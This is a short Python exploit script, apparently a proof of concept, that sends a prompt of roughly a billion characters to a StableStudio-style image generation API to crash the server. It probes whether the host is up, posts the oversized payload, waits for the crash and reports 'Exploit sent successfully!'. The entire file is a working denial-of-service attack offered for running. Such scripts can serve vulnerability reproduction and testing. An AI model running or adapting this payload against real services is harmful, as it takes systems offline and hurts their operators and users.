import requests
import time
import sys
import os

# Number of extra characters to be added to the prompt text
num = 500000000

# Large text by repeating the character "/#" num times
large_text = "/#" * num

# Get hostname from environment variable
hostname = os.environ.get("HOSTNAME", "localhost")
url = f"http://{hostname}:8000/api/stablestudio/generate"

print(f"Using URL: {url}")

# JSON payload with the large text in the prompt
json_payload = {
    "input": {
        "sampler": {
            "id": "ddim",
            "name": "ddim"
        },
        "height": 512,
        "width": 512,
        "model": "SD-1.5",
        "seed": 0,
        "steps": 50,
        "style": "enhance",
        "prompts": [
            {
                "text": large_text,
                "weight": 1
            }
        ]
    },
    "count": 1
}

# Headers
headers = {
    "Content-Type": "application/json"
}

# First check if the server is responding
try:
    print(f"Checking if server is responding at: {url}")
    # Just try a HEAD request to see if the server is up
    response = requests.head(url, timeout=5)
    print(f"Server is responding at {url} with status: {response.status_code}")
    server_responding = True
except Exception as e:
    print(f"Server not responding at {url}: {str(e)}")
    print("Trying the exploit anyway...")
    server_responding = False

# Try to send the exploit
exploit_sent = False
try:
    print(f"Trying to exploit using URL: {url}")
    # Make the POST request and disable SSL verification
    response = requests.post(url, headers=headers, json=json_payload, verify=False, timeout=30)
    print(f"Response status: {response.status_code}")
    print(f"Response content: {response.text}")
    exploit_sent = True
except requests.exceptions.ReadTimeout:
    print(f"Request timed out for {url} - this might indicate the server is crashing!")
    exploit_sent = True
except Exception as e:
    print(f"Error with {url}: {str(e)}")
    print("Exploit may not have worked.")

# Wait a moment to ensure the server has time to crash
print("Waiting for server to crash...")
time.sleep(10)

# Exit with success if we sent the exploit
if exploit_sent:
    print("Exploit sent successfully!")
    sys.exit(0)
else:
    print("Failed to send exploit!")
    sys.exit(1)

